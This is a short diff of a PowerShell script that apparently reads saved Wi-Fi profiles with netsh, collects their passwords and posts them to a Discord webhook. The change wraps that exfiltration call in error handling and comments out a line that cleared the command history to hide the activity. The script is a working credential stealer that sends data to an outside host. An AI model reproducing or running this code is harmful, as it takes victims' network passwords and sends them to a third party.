@@ -8,8 +8,15 @@ netsh wlan show profile | Select-String '(?<=Tutti i profili utente\s+:\s).+' | 
 		'content' = [string]$passw
 	}
 	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+  # Old
+	#Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+  # New
+  try {
+     Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+  } catch {
+     Write-Host "Some err: $_"
+  }
 }
 
 # Clear the PowerShell command history
-Clear-History
+#Clear-History
